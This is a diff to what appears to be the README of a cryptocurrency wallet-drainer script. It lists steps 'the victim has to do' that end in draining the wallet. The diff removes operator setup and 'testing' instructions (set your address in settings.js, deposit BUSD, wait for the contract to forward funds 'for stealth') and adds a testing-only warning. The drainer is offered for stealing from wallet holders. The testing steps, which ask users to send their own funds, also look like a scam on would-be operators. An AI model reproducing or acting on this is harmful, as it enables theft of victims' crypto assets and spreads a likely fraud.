@@ -142,17 +142,7 @@ Steps that the !!! victim !!! has to do
 
 4.Drain wallet
 
-TESTING (OPTIONAL)
-
-To test deposit busd on your wallet of at least 50 dollars or more the smart contract was designed to only drain wallets with value similiar to nft drainers
-
-make sure you added your address to settings.js then click approve
-
-click on start mining button only send 1 dollar to test
-
-wait for smart contract to foward it to you it make take 2-48 hours for stealth
-
-To use all you have to do is put your wallet address in the settings.js file.
+### ONLY USE FOR TESTING WARNING ###
 
 !!!!!!!!!!!!!!!!!!! Cloning this script will not allow my software to send money to you do not clone if you test this script if you do you will be less likely to recieve payments from testing !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
